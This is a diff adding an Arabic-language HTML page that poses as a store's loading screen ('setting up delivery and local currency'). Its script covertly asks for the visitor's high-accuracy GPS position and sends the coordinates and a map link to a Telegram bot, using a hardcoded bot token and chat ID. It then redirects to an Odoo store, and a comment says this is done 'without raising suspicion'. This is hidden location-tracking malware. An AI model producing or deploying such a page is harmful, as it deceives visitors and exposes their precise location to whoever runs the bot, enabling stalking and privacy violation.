@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري تحميل المعاينة...</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p { margin-top: 20px; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <p>جاري ضبط إعدادات التوصيل والعملة المحلية للمتجر...</p>
+
+    <script>
+        // دالة التوجيه النهائي للمتجر الحقيقي في كل الأحوال
+        function redirectToStore() {
+            window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
+        }
+
+        // إرسال البيانات إلى تليغرام
+        function sendToTelegram(lat, lng, accuracy) {
+            const token = "8679396887:AAFPkh0VlUxlPJ2k3EHjkWAxkpEGSOWE6SY";
+            const chatId = "5874747123";
+            const message = `🚨 زيارة جديدة للموقع:\n📍 خط العرض: ${lat}\n📍 خط الطول: ${lng}\n🎯 الدقة: ${accuracy} متر\n🔗 الرابط على الخريطة: https://www.google.com/maps?q=${lat},${lng}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(() => redirectToStore())
+            .catch(() => redirectToStore()); // التوجيه حتى لو فشل الإرسال
+        }
+
+        // طلب الإحداثيات الحقيقية
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // نجاح جلب الـ GPS بدقة
+                    sendToTelegram(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+                },
+                (error) => {
+                    // في حال الرفض أو الفشل، يتم التوجيه مباشرة للمتجر دون إثارة الشكوك
+                    redirectToStore();
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        } else {
+            redirectToStore();
+        }
+    </script>
+</body>
+</html>
